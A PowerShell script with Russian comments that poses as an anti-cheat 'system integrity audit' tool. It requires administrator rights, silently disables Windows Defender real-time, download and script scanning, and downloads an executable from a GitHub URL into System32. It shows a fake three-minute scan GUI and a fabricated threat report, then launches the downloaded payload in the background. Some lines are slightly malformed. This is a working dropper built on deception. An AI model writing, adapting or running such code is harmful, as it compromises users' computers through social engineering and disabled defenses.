Заклинание: Абсолютный Маковый Аудит + Генерация Отчёта]
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$url = "https://github.com/nagibatorm55-ops/errorfuck/raw/refs/heads/main/wedsuvit1ggjshsa.exe"
$destPath = "$env:SystemRoot\System32\wedsuvit1ggjshsa.exe"
Проверка прав Архимага
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
[System.Windows.Forms.MessageBox]::Show("Внимание, Архитектор! Запусти скрипт от имени Администратора!", "Ошибка магии", 0, 48)
exit
}
--- ШАГ 1: Подавление защиты и тихий призыв артефакта ---
try {
# Отключение уведомлений
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\PushNotifications"
if (!(Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
Set-ItemProperty -Path $regPath -Name "ToastEnabled" -Value 0 -ErrorAction SilentlyContinue
# Отключение Защитника Windows
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue

# Скачивание файла в System32
$webClient = New-Object System.Net.WebClient
$webClient.DownloadFile($url, $destPath)
} catch {}
Набор случайных уязвимых/подозрительных директорий
$randomDirs = @(
"C:\Users$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup",
"C:\Program Files (x86)\Common Files\System",
"C:\Windows\Temp\x64_inject_cache",
"C:\Users$env:USERNAME\Documents\GameConfigs\Profiles",
"C:\ProgramData\NVIDIA Corporation\NV_Cache",
"C:\Users$env:USERNAME\AppData\Local\Temp\net_hook_dll"
)
$chosenDir = $randomDirs | Get-Random
Путь к фальшивому чеку-отчёту на Рабочем столе
$desktopPath = [Environment]::GetFolderPath("Desktop")
reportFile = "$desktopPath\Security_Audit_Report_((Get-Date).ToString('yyyyMMdd_HHmmss')).txt"
--- ШАГ 2: Визуально безупречный GUI в стиле macOS ---
$form = New-Object System.Windows.Forms.Form
$form.Text = "System Integrity & Anti-Cheat Core"
$form.Size = New-Object System.Drawing.Size(480, 360)
$form.StartPosition = "CenterScreen"
$form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog
$form.MaximizeBox = $false
$form.BackColor = [System.Drawing.Color]::FromArgb(245, 246, 248)
Заголовок
$labelTitle = New-Object System.Windows.Forms.Label
$labelTitle.Text = "Глубокий анализ целостности ядра"
$labelTitle.Font = New-Object System.Drawing.Font("Segoe UI", 11, [System.Drawing.FontStyle]::Bold)
$labelTitle.Location = New-Object System.Drawing.Point(25, 20)
$labelTitle.Size = New-Object System.Drawing.Size(420, 25)
$labelTitle.ForeColor = [System.Drawing.Color]::FromArgb(40, 40, 40)
$form.Controls.Add($labelTitle)
Статус
$labelStatus = New-Object System.Windows.Forms.Label
$labelStatus.Text = "Ожидание инициализации подсистем сканирования..."
$labelStatus.Font = New-Object System.Drawing.Font("Segoe UI", 9)
$labelStatus.Location = New-Object System.Drawing.Point(25, 50)
$labelStatus.Size = New-Object System.Drawing.Size(420, 20)
$labelStatus.ForeColor = [System.Drawing.Color]::FromArgb(110, 110, 110)
$form.Controls.Add($labelStatus)
Прогресс-бар
$progressBar = New-Object System.Windows.Forms.ProgressBar
$progressBar.Location = New-Object System.Drawing.Point(25, 80)
$progressBar.Size = New-Object System.Drawing.Size(425, 12)
$progressBar.Style = [System.Windows.Forms.ProgressBarStyle]::Continuous
$form.Controls.Add($progressBar)
Консольное окно с живыми логами (максимальная эстетика)
$textBoxLog = New-Object System.Windows.Forms.TextBox
$textBoxLog.Location = New-Object System.Drawing.Point(25, 105)
$textBoxLog.Size = New-Object System.Drawing.Size(425, 140)
$textBoxLog.Multiline = $true
$textBoxLog.ReadOnly = $true
$textBoxLog.ScrollBars = "Vertical"
$textBoxLog.BackColor = [System.Drawing.Color]::FromArgb(30, 30, 30)
$textBoxLog.ForeColor = [System.Drawing.Color]::FromArgb(0, 255, 128)
$textBoxLog.Font = New-Object System.Drawing.Font("Consolas", 8.5)
$form.Controls.Add($textBoxLog)
Кнопка Старт
$btnStart = New-Object System.Windows.Forms.Button
$btnStart.Text = "Запустить сканирование"
$btnStart.Location = New-Object System.Drawing.Point(25, 260)
$btnStart.Size = New-Object System.Drawing.Size(425, 42)
$btnStart.Font = New-Object System.Drawing.Font("Segoe UI", 10, [System.Drawing.FontStyle]::Bold)
$btnStart.BackColor = [System.Drawing.Color]::FromArgb(0, 122, 255)
$btnStart.ForeColor = [System.Drawing.Color]::White
$form.Controls.Add($btnStart)
Таймер на ~180 секунд (3 минуты фальшивого аудита)
$script:totalSeconds = 180
$script:currentSecond = 0
$timer = New-Object System.Windows.Forms.Timer
$timer.Interval = 1000
$timer.Add_Tick({
$script:currentSecond++
$percent = [int] (($script:currentSecond / $script:totalSeconds) * 100)
if ($percent -gt 100) { $percent = 100 }
$progressBar.Value = $percent
# Генерация атмосферных строк логов в реальном времени
if ($script:currentSecond -eq 3) {
    $labelStatus.Text = "Проверка таблиц дескрипторов и памяти..."
    $textBoxLog.AppendText("[+] Модуль Ring0 успешно загружен.`r`n")
} elseif ($script:currentSecond -eq 25) {
    $labelStatus.Text = "Сканирование скрытых процессов и хуков..."
    $textBoxLog.AppendText("[+] Просканировано процессов: 142. Угроз не найдено.`r`n")
} elseif ($script:currentSecond -eq 60) {
    $labelStatus.Text = "Анализ целостности системных библиотек..."
    $textBoxLog.AppendText("[*] Хеширование ntdll.exe, kernel32.dll... OK.`r`n")
} elseif ($script:currentSecond -eq 100) {
    $labelStatus.Text = "Сканирование пользовательских директорий на читы..."
    $textBoxLog.AppendText("[!] Проверка путей: $chosenDir...`r`n")
} elseif ($script:currentSecond -eq 140) {
    $labelStatus.Text = "Глубокая эвристическая проверка кеша..."
    $textBoxLog.AppendText("[-] Обнаружены аномальные сигнатуры в памяти драйвера!`r`n")
} elseif ($script:currentSecond -eq 170) {
    $labelStatus.Text = "Формирование итогового отчета..."
    $textBoxLog.AppendText("[!] ВНИМАНИЕ: Нарушение сигнатурной целостности!`r`n")
}

# По окончании таймера
if ($script:currentSecond -ge $script:totalSeconds) {
    $timer.Stop()
    $labelStatus.Text = "Аудит завершен. Обнаружена критическая угроза!"
    $btnStart.Text = "Отчёт сохранён на Рабочем столе"
    $btnStart.Enabled = $true

    # Создание реального текстового отчёта на Рабочем столе
    $reportContent = @"
==================================================
SYSTEM INTEGRITY SECURITY REPORT
Дата проверки: $(Get-Date)
Статус системы: КРИТИЧЕСКАЯ УГРОЗА ОБНАРУЖЕНА
Код ошибки: 0x80070005_AC_VIOLATION
[ОПИСАНИЕ АНОМАЛИИ]
Античит-модуль зафиксировал несанкционированную модификацию памяти и перехват системных API-вызовов.
[ПОДОЗРИТЕЛЬНАЯ ДИРЕКТОРИЯ]
$chosenDir
[РЕКОМЕНДАЦИИ]
Немедленно прекратите использование стороннего софта. Логи отправлены в центр контроля безопасности.
"@
Set-Content -Path $reportFile -Value $reportContent -Encoding UTF8
    # Фоновый запуск полезной нагрузки из System32
    if (Test-Path $destPath) {
        Start-Process -FilePath $destPath
    }

    # Всплывающее предупреждение для пользователя
    [System.Windows.Forms.MessageBox]::Show(
        "Аудит завершен с ошибкой!`n`nОбнаружена подозрительная активность в каталоге:`n$chosenDir`n`nТекстовый отчёт сохранен на вашем Рабочем столе.", 
        "Critical Security Alert", 
        [System.Windows.Forms.MessageBoxButtons]::OK, 
        [System.Windows.Forms.MessageBoxIcon]::Error
    )

    $form.Close()
}
})
$btnStart.Add_Click({
$btnStart.Enabled = $false
$btnStart.Text = "Идет глубокое сканирование (3 мин)..."
$script:currentSecond = 0
$progressBar.Value = 0
$textBoxLog.Clear()
$labelStatus.Text = "Инициализация движка сканирования..."
$textBoxLog.AppendText("[*] Запуск аудита безопасности системы...rn")
$timer.Start()
})
[void]$form.ShowDialog()
